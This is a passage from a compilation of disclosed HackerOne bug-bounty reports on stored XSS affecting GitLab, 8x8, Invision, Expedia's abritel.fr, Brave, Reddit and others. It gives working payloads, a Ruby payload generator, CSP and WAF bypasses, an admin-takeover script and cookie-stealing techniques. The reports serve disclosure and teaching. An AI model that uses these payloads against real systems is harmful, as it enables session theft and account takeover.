```html
<a rel="nofollow noreferrer noopener" class="gfm" href="http:'&quot;&lt;" target="_blank">a</a>
```


So fare, we can introduce any attribute into `<a>` tag, or add arbitrary tag. The latter will have no attribute because no space between tag name and attribute (any space character is URI encoded when serializing `href`). 

For example:

- input:

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'"yvvdwf=here&gt;&lt;img/src="0"onerror="alert(0)"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl> 
```

- output:

```html
<dl>&#x000A;<a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268">https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>*<i><a href="http:'" yvvdwf="here"><img></a><a>https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>" class="gfm"&gt;a</i>&#x000A;</dl>
```

## 3. mXSS

The backend parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between tag name and the attribute. Howeverthe browser supports HTML5 which tolerate some additional characters, such as `/`.

For example, this snippet `<img/src="0"onerror="alert(0)">` will give different result:
- `<img>` at the backend {F2868308}
- `<img src="0" onerror="alert(0)">` at the browser

As we can inject any tag, we use `<style>` to keep inside the snippet which will be sent to browser as-is:

```html
<style><img/src="0"onerror="alert(0)"></style>
```

Finally, to be able to get the `<img>` tag back, we put all of them inside `<svg>` tag:

```html
<svg><style><img/src="0"onerror="alert(0)"></style></svg>
```

At the browser, the`<img>` tag  is mutated to get outside of `<svg>` context. Thus we get the following result:

```html
<svg><style></style></svg>
<img src="0" onerror="alert(0)">
```

Until here, we can inject any tag with any attribute. By using the basic payload `<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>` we can get XSS.

## payload

This is a small Ruby snippet to generate the payload:

```ruby
def gen_payload( payload, based_url: "https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
  payload    = "#{payload}#{based_url}" unless payload.include? based_url
  payload    = payload.gsub('<', '&lt;').gsub('>', '&gt;')

  es_payload = %(*<i><a href="http:#{ payload.gsub('"','&quot;') }" class="gfm">a</a></i>)
  es_payload = CGI.escape_html( es_payload ).gsub('%20', '%2520') #double encode space/tab/new_line

  a = %(<dl><a href="#{ based_url }#{ es_payload }">#{ based_url }*<i>[[a|http:#{ payload }]]</i></a></dl>)
  puts a
end

gen_payload %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>)
```

Best regards,
yvvdwf

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

---

### [Stored XSS on LinkedIn App via iframe tag in Article](https://hackerone.com/reports/2212950)

- **Report ID:** `2212950`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** LinkedIn
- **Reporter:** @domg
- **Bounty:** - usd
- **Disclosed:** 2024-02-28T07:00:21.300Z
- **CVE(s):** -

**Summary (team):**

A stored XSS  issue was reported on “LinkedIn Article” where a malicious JavaScript (JS) payload can be embedded in URL field of iframe. When such article gets published, and accessed on LinkedIn Mobile App, the malicious JS would get executed in victim’s context.  Upon receiving this report, we resolved it on a priority basis and paid the researcher a bounty.

**Summary (researcher):**

sog

---

### [Client Side Template Injection to Stored XSS in Image Collection](https://hackerone.com/reports/2234564)

- **Report ID:** `2234564`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Mars
- **Reporter:** @themarkib0x0
- **Bounty:** - usd
- **Disclosed:** 2024-02-14T15:33:01.050Z
- **CVE(s):** -

**Summary (team):**

Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages. When rendering a page, the framework scans it for template expressions and executes any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. Attacker can steal victim session cookies and takeover their account.

---

### [Stored xss at https://█.8x8.com/api/█/ID](https://hackerone.com/reports/2078490)

- **Report ID:** `2078490`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** 8x8
- **Reporter:** @pentestor
- **Bounty:** 1337 usd
- **Disclosed:** 2023-10-30T17:18:43.999Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
hey , 
i found a stored  xss at `https://██████.8x8.com/api/██████mentInfoById/ID` , when i analysis javascript code i understand user can modify her ip address with endpoint `https://███.8x8.com/api/patchPaymentMethod/ID` , next point i understand when we open    `https://████████.8x8.com/api/██████████mentInfoById/ID` server set `Content-Type: text/html;charset=UTF-8` , this was interesting point , then i modify ip address with this request:
```
POST /api/patchPaymentMethod/█████████ HTTP/2
Host: ███.8x8.com
Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fbp=fb.1.1689701587161.1730712436; __cf_bm=MloB4oUJmeviUXpE1GRUn8TtqbE4CwVEttuZr9tUrOQ-1689845706-0-AWJDz0q9F1c0CmKcbShEYyS7Qqsfd88Gb9W9YsIXUoHhnP/aHA+wGRccAnb8GxD1HBTGXJ71aHh7XzOojjLP/sg=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 112

{
              "ipAddress": "<svg on onload=(alert)(document.domain)>",
"callBackURL":"dssdsd"
            }
```
now i get response : 
```
HTTP/2 400 Bad Request
Date: Thu, 20 Jul 2023 23:30:32 GMT
Content-Length: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Expires: 0
Pragma: no-cache
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Gk-Traceid: e97be98a-d5e6-4fce-a6a5-4d5f6d28b02a
X-Regional-Id: usw2-gk-65dc71e19a79
X-Served-Epoch: 1689895832189
X-Xss-Protection: 1; mode=block
Cf-Cache-Status: DYNAMIC
Set-Cookie: __cf_bm=7dklJH6I0nIayzUSs2ga_6bhxG_AZTclwDwaUIaKeBQ-1689895832-0-AQvIhwqEdRP3rLeIkHe1u4gqwspbam+/6s7/WEIOEsrvvvpuOSaaBNi36GsWEVNOGQWbRBz4Z89eCgjOTdOWGv0=; path=/; expires=Fri, 21-Jul-23 00:00:32 GMT; domain=.8x8.com; HttpOnly; Secure; SameSite=None
Server: cloudflare
Cf-Ray: 7e9efe156adf41f9-EWR


```

then i check url : https://█████████.8x8.com/api/██████████mentInfoById/████ 
and i seen ip address updated and █████load successfully executed : 
█████████
  
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. open url : https://███.8x8.com/api/████mentInfoById/█████ 
  1. you can see my injected ████████load executed :D 

## Supporting Material/References:
███

## Impact

Stealing cookies and executed javascript in victim browser

**Summary (team):**

@pentestor reported to us an issue where already submitted data could have been modified and malicious JavaScript been introduced in selected fields. Payment receipts are identified using a 32 characters randomly generated hash, hence this was an isolated issue.

Example:
```json
POST /api/patchPaymentMethod/ID HTTP/2
…

{
  "ipAddress": "<svg on onload=(alert)(document.domain)>",
  "callBackURL": "dssdsd"
}
```

Our team put additional Access Control checks & user input sanitisation in place, which resolved the issue.

---

### [XSS with Visual Language Editor tags](https://hackerone.com/reports/2031855)

- **Report ID:** `2031855`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Invision Power Services, Inc.
- **Reporter:** @mpiosik
- **Bounty:** - usd
- **Disclosed:** 2023-09-17T09:23:00.440Z
- **CVE(s):** -

**Vulnerability Information:**

1. Create a post/comment/signature/etc. with the following text: `#VLE#nothing#[<script>ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {'bypassRedirect':true, 'method': 'POST', 'data': {'csrfKey': key, 'site_online_checkbox':1, 'board_name': 'You have been hacked', 'form_submitted': 1}}))</script>]#!##`.
2. Using e.g. the browser's Inspect Element feature, you can surround the text in editor with `<span style='font-size: 0px;'>` and `</span>` to make it invisible for humans.
3. Once the content is posted, visit the page with the content created in step 1. with **Quick Translating** enabled (ACP -> Customization -> Localization -> Languages -> Translations -> Quick Translating, otherwise known as Visual Language Editor or VLE) using an account with administrator privileges.

**Note**: This is not very uncommon, as one could simply suggest an administrator to change wording of a language phrase, or correct a translation in an area where user-generated content (such as comments) is displayed.

4. After visiting the webpage, website name will change to `You have been hacked` (the change can be seen in the browser tab title or in the website's header).

The origin of the vulnerability is **line 254** in `applications/core/dev/js/global/controllers/customization/ips.customization.visualLang.js`. jQuery's `replaceWith` function, which accepts raw HTML, is fed with `.text()` output, which returns unescaped (non-HTML-encoded) text.

(Code from step 1 formatted for readability):
```js
ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(
    ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {
        'bypassRedirect':true,
        'method': 'POST',
        'data': {
            'csrfKey': key,
            'site_online_checkbox':1,
            'board_name': 'You have been hacked',
            'form_submitted': 1
        }
    }
))

## Impact

**The attacker could gain full control of the website and its data, including the ability to execute raw PHP code**. This example shows only a relatively harmless and very simple usage of the vulnerability, but **it can be used to perform any other action on the administrator's behalf**. For instance, attacker could prepare a script to modify a theme template to execute any given PHP code.

Surrounding the VLE code with legitimate text and `<span class="font-size: 0px;">...</span>`makes it invisible for humans, and it could be hidden from built-in search as well by placing it in a signature, for example. The post/signature can then be removed. Without knowing exactly what to look for, the attack origin might never be found.

---

### [MetaMask Browser URL and Transaction Origin Spoofing - Metamask wallet Android & Metamask wallet iOS](https://hackerone.com/reports/1751333)

- **Report ID:** `1751333`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** MetaMask
- **Reporter:** @renekroka
- **Bounty:** - usd
- **Disclosed:** 2023-07-04T13:55:32.559Z
- **CVE(s):** -

**Summary (team):**

@renekroka and @hackerontwowheels from the talented team at [UGWST](https://ugwst.com/) discovered a bug that prevented the MetaMask Mobile browser from correctly updating the domain of the browser tab after a redirect.

By exploiting this bug, the duo demonstrated that if a user was redirected from a trusted dApp to a malicious one, any transactions requested by the malicious dApp would appear to have originated from the trusted source. Note that for the malicious dApp to have permissions to request transactions, the wallet owner would have had to explicitly confirm they would like to connect their wallet to it.

Our team worked swiftly to work on a fix that was rolled out to all users shortly after.

The MetaMask team would like to thank @renekroka and @hackerontwowheels for their demonstration of professionalism, incredible report, and for helping make MetaMask safer for all its users.

---

### [Universal XSS with Playlist feature](https://hackerone.com/reports/1436558)

- **Report ID:** `1436558`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 750 usd
- **Disclosed:** 2023-06-22T05:51:24.392Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Brave iOS has three weaknesses described below. By combining them, Universal XSS can be achieved.

1. Exposure of UserScriptManager.securityToken
[Playlist.js](https://github.com/brave/brave-ios/blob/fdff99ca3997816322015fe5efcd63490193b88d/Client/Frontend/UserContent/UserScripts/Playlist.js#L353) embeds the exact value of the `$<notifyNode>` into `HTMLVideoElement.prototype.setAttribute`. By reading the value, an attacker can retrieve the hidden security token.

2. Exposure of UserScriptManager.messageHandlerToken
Also, [WindowRenderHelper.js](https://github.com/brave/brave-ios/blob/83eb41ac922d7bd18fd311e0a4279e02cdd8e190/Client/Frontend/UserContent/UserScripts/WindowRenderHelper.js#L12) embeds the exact value of the `$<handler>` into `W{securityToken}.postMessage`. By reading the value, an attacker can retrieve the hidden message handler token.

3. UXSS in PlaylistHelper through nodeTag
[PlaylistHelper.swift](https://github.com/brave/brave-ios/blob/83eb41ac922d7bd18fd311e0a4279e02cdd8e190/Client/Frontend/Browser/PlaylistHelper.swift#L228) concatenates strings to build a JavaScript code and executes it on the mainframe of a WebView. Then, `nodeTag` given from a webpage is directly included in the code. So, if the `nodeTag`, named as `tagId` in JS world, passed from the page contained `');alert(document.location);//`, unintended `alert()` is executed on the mainframe.

## Products affected: 

 * Brave iOS 1.32.3 and higher (include the latest Nightly)

## Steps To Reproduce:

 * Visit the Google page: https://sites.google.com/view/nishimunea-brave-uxss1/page
* This page contains a cross origin malicious page https://csrf.jp/brave/playlist.php in an iframe
* The iframe exploits the above three weaknesses to send a message to playlistHelper
* Push `Add to Brave Playlist` and `Open` button in the setting menu
* An alert dialog is appear on the sites.google.com

## Supporting Material/References:

  * Demonstration movie is attached

## Impact

* Universal XSS on the arbitrary domains

---

### [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349)

- **Report ID:** `1731349`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 13950 usd
- **Disclosed:** 2023-06-02T01:55:16.700Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the resulting `img` tag. 

The css selector for finding a valid node to convert into a kroki diagram checks for either `pre[lang="#{diagram_type}"] > code` or for `pre > code[lang="#{diagram_type}"]`, but the diagram type is then set using `node.parent['lang'] || node['lang']`.

So if the `code` block has a valid lang (such as `wavedrom`) then the css selector will match, but if the parent `pre` also has a `lang` attribute then it will be the one that is used and can be an arbitrary value.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L17
```ruby
        diagram_selectors = ::Gitlab::Kroki.formats(settings)
                                .map do |diagram_type|
                                  %(pre[lang="#{diagram_type}"] > code,
                                  pre > code[lang="#{diagram_type}"])
                                end
                                .join(', ')

        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)
        return doc unless doc.at_xpath(xpath)

        diagram_format = "svg"
        doc.xpath(xpath).each do |node|
          diagram_type = node.parent['lang'] || node['lang']
          diagram_src = node.content
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
```

The `diagram_type` is then used as-is to create a url, which is used to create an image with `<img src="#{image_src}" />`. So if a double quote is used in the `diagram_type` then arbitrary attributes can be added (apart from `class` as that is replaced just below).

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L31
```ruby
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
          img_tag = img_tag.children.first

          next if img_tag.nil?

          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT
          img_tag.set_attribute('hidden', '') if lazy_load
          img_tag.set_attribute('class', 'js-render-kroki')

          img_tag.set_attribute('data-diagram', diagram_type)
          img_tag.set_attribute('data-diagram-src', "data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}")

          node.parent.replace(img_tag)
```

### Steps to reproduce

1. On a self-hosted gitlab, ensure that `Kroki` is enabled at `/admin/application_settings/general`{F2080922} 
1. Create an issue and use the following payload `<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>`
1. Reload/Visit the issue
1. If you do not have CSP enabled you will see the alert pop, otherwise you will see a CSP violation in the console such as `Refused to execute inline event handler because it violates the following Content Security Policy directive`

Since the `class` attribute cannot be set finding a CSP bypass was a bit tricky but there are still a few `data` based attributes that can be used, one of them being `data-diff-for-path` from `single_file_diff.js`. This is used as the path to load when the "expand diff" chevron is clicked allowing an arbitrary json file to be loaded and have jquery execute it to bypass the CSP.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/app/assets/javascripts/single_file_diff.js#L77
```javascript
    return axios
      .get(this.diffForPath)
      .then(({ data }) => {
        this.loadingContent.hide();
        if (data.html) {
          this.content = $(data.html);
```

Since clicking the chevron is a bit unlikely, we can inject the `style` attribute to make the kroki overlay the entire page,  which when clicked injects some styles to make the `chevron` now overlay the entire page. 

1. Enable CSP on gitlab - https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy
1. Create a public snippet  with a json file `aaa.json` containing `{"html":"<script>alert(document.domain)</script>"}`, then open the `raw` version and make note of the path.
1. Create a new project and commit a readme
1. View the individual commit (eg http://gitlab.wbowling.info/root/kroki1/-/commit/f4170b940214abeebc6fd7503f9500c72c358613)
1. Add a comment to a line of the commit using the following payload, replacing `data-diff-for-path` with the path to your json file noted above:
```html
<a>
    <pre lang='/" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '>
        <code lang="wavedrom">csp</code>
    </pre>
    <pre
        lang='/" id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;" data-triggers="click" data-toggle=popover data-html=true data-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb" data-content=ggg '>
    <code lang="wavedrom">
    bypass
    </code>
    </pre>
</a>
```
1. Reload the page
1. Clicking anywhere on the page twice will trigger the xss

{F2080931}

### Impact

Allows arbitrary javascript to be executed when a victim views a comment 

### What is the current *bug* behavior?

The the lang attribute from the parent node is always used even if the css selector matches the child node

### What is the expected *correct* behavior?

The lang attribute should only be used if it is actually valid. The `img` tag should also be created using `content_tag` instead of string concatination.

### Output of checks
#### Results of GitLab environment info

```
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.6p219
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	15.6.2-ee
Revision:	08b668e8740
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.12
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.13.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## Impact
Allows arbitrary javascript to be executed when a victim views a comment

---

### [Stored XSS in merge request pages](https://hackerone.com/reports/723307)

- **Report ID:** `723307`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @mike12
- **Bounty:** 3500 usd
- **Disclosed:** 2023-05-30T06:55:16.590Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Gitlab!

[Vulnerable code](https://gitlab.com/gitlab-org/gitlab/blob/9d81e97d9d111f874799605ce50ae480ae15b0c5/app/assets/javascripts/vue_merge_request_widget/components/states/mr_widget_rebase.vue#L47)

To reproduce the bug, we need to open a merge request with the following conditions:
1. Project must have 'Merge commit with semi-linear history' or 'Fast-forward merge' merge method
2. The merge request must require rebase before fast-forward/merge
3. A visitor of the merge request page must not have permissions to push to source branch
4. Target branch name must have a special name `<img/src='x'/onerror=alert(document.domain)>` :) 

**Steps to reproduce:**

1. Run Gitlab `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
2. Create a new project
3. Go to the project settings and set the 'Merge method' to 'Fast-forward merge' or 'Merge commit with semi-linear history' {F618529}
4. Clone the repository and run the following in the repository:

    ```bash
    touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
    ```

5. Create a merge request `master` => `<img/src='x'/onerror=alert(document.domain)>`
6. Then we have to visit the merge request page under a user who does not have permissions to push to the source branch (in our case, `master` branch). For example: 
  * Make the project public and visit the merge request page under any user who does not have permissions in the project (or without authorization)
  * Invite a user to the project, but without permissions to push to the source branch.

{F618526}
{F618527}
{F618528}

```bash
root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.0
Revision:	1425a56c75b
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
root@gitlab:/# 
```

## Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data
3. Steal user's credentials

---

### [RichText parser vulnerability in scheduled posts allows XSS](https://hackerone.com/reports/1930763)

- **Report ID:** `1930763`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Reddit
- **Reporter:** @la_revoltage
- **Bounty:** 5000 usd
- **Disclosed:** 2023-04-20T18:37:38.642Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
RichText parser is not filtering links when editing scheduled posts

## Steps To Reproduce:

  1. Create a new scheduled post with a link: {F2270188}
  2. Intercept the request with Burp Suite/Other proxies and replace the link with javascript scheme payload: {{F2270195}
  3. Navigate to scheduled posts and click Edit: {F2270203}
  4. Observe the malicious link, if you click on it, the javascript will execute: {F2270204}

## Root cause and possible ways leverage
When submitting a scheduled post, API doesn't validate links, it happens only on the client side and the links can be forged with interception of requests. Though, it seems it is impossible to get the XSS in live post, when submitting the malicious post, reddit turns richtext to markdown and then to html, which automatically removes invalid links. Another possible way to bring it in real post, is to use Link type and also forge the link, but when submitting it will just give an error

## Impact

Attacker can trick admins to visit the scheduled editing page and click on malicious link, which results in XSS

**Summary (researcher):**

Reddit's MarkDown parser wasn't filtering hyperlinks on server-side in scheduled post feature, which lets attacker to modify a request with normal hyperlink embeding a malicious link using javascript scheme

---

### [Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)](https://hackerone.com/reports/1760213)

- **Report ID:** `1760213`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Expedia Group Bug Bounty
- **Reporter:** @bombon
- **Bounty:** - usd
- **Disclosed:** 2023-04-01T19:59:48.752Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Report #1698316 was closed as resolved 

You told me that the stored XSS was going to be resolved since "As this relies on the same root cause, we will be closing it as duplicate", but no 


abritel.fr has a strong WAF, however the server hides double quotes, allowing to bypass the WAF

e.g

The server blocks `</script`but if I send `</sc"ript>`

WAF is bypassed and the output is </script>


## Steps To Reproduce:


1-> Send this request 

```http
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```

2-> Using another browser visit: 

https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.jpeg?xxxd

Exploit:

This is the payload to extract the HASESSIONV3 
xss"</sc"ript><sv"g/onloa"d=aler"t"(window.INITIAL_STATE.system.cookie)>


## Supporting Material/References:

{F2016192}

## Impact

Stored XSS to Account Takeover

**Summary (researcher):**

I was able to Takeover Accounts Via Cache Poisoning (XSS)

This was possible due to:

1. `hav` cookie was reflected in the Response on https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js
```javascript
var hav="value from cookie"
```

2. The server had a protection where it was "Hiding" double quotes, however the server was not doing that with greater than and less than symbols (<>) which allowed me to closed the script tag and using that double quotes protection I was able to Bypass the WAF easily

WAF would trigger when:

```http
Cookie: hav=xss"</script><svg/onload=alert(document.domain)>
```
---

But using double quotes I was able to bypass the WAF:

```http
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
```

Which reflected in the response as:

```html
var hav="xss</script><svg/onload=alert(document.domain)>"
```


3. The Server sees https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js as a "cacheable" response, therefore the reflected value in the cookie was saved in that Page, any user who visited https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js would get XSSed

4. Session cookie was HTTPonly Flagged, however, In this same page where the XSS was, there was a JS Variable called `window.INITIAL_STATE.system.cookie`  where the session was located in clear text

With these four factors combined, I was able to Takeover Accounts

Team Fixed this by not reflecting ‘hav’ anymore.


[X](https://twitter.com/bxmbn)

---

### [Stored-XSS with CSP-bypass via labels' color](https://hackerone.com/reports/1665658)

- **Report ID:** `1665658`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2023-02-19T22:44:01.783Z
- **CVE(s):** -

**Vulnerability Information:**

Gitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS. 


# Step to reproduce

To reproduce, we need the following prerequisite: 

- Github does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server
- A VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.
- I created the dummy server using nodejs, so you need to have also nodejs on the machine
- A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.


# Step 1: run the dummy server

- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

# Step 2: trigger Gitlab import

- Open a new terminal, then run the following command in which:

   + `YOUR_IP` and `YOUR_PORT` by the values in the previous step
   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:80"
}'
```

After finishing, you can view the list of the labels of the imported project. You should see an popup created by this js `alert(document.domain)`

An example is available here (private project): https://gitlab.com/yvvdwf/xss-on-label-color/-/labels


# Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

---

### [Bypass: Stored-XSS with CSP-bypass via scoped labels' color](https://hackerone.com/reports/1693150)

- **Report ID:** `1693150`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2023-02-19T22:43:39.198Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

